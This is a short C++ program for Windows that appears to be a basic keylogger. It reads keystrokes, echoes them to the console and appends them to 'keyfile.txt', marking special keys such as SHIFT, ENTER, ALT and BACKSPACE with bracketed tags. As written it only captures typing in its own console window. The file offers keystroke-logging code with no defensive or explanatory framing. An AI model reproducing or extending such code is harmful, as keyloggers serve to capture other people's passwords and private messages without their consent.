#include <iostream>
#include <fstream>
#include <windows.h>
#include <conio.h>

using namespace std;

int keys(char key , fstream&);

int main(){
    
    char keystrokes;
    int ascii;
    fstream thefile;
    thefile.open( "keyfile.txt" , ios::in | ios::out);
    thefile.close();
    
    while(true)
    {
        keystrokes = getch();
        ascii = keystrokes;
        cout << "Here --> " << keystrokes <<endl;
        
        if(7 < ascii && 256 > ascii)
        {
            keys(keystrokes , thefile);
            }
            
    } 
    return 0;
}

int keys(char key , fstream& file)
{
    file.open( "keyfile.txt" , ios::app | ios::in | ios::out);
    if(file){
    if(GetAsyncKeyState(VK_SHIFT))
    {
      file << "[SHIFT]";
    }
    else if(GetAsyncKeyState(VK_ESCAPE))
    {
      file << "[ESCAPE]";
    }                           
    else if(GetAsyncKeyState(VK_RETURN))
    {
      file << "[ENTER]";
    }
    else if(GetAsyncKeyState(VK_CONTROL))
    {
      file << "[CONTROL]";
    }
    else if(GetAsyncKeyState(VK_MENU))
    {
      file << "[ALT]";
    }
    else if(GetAsyncKeyState(VK_DELETE))
    {
      file << "[DELETE]";
    }
    else if(GetAsyncKeyState(VK_TAB))
    {
      file << "[TAB]";
    }
    else if(GetAsyncKeyState(VK_BACK))
    {
      file << "[BACKSPACE]";
    }
    else
    {
      // storing the keystrokes (other than special keys) in the file
      file << key;
    }
    }
    file.close();
return 0;
}
    
    
    
    
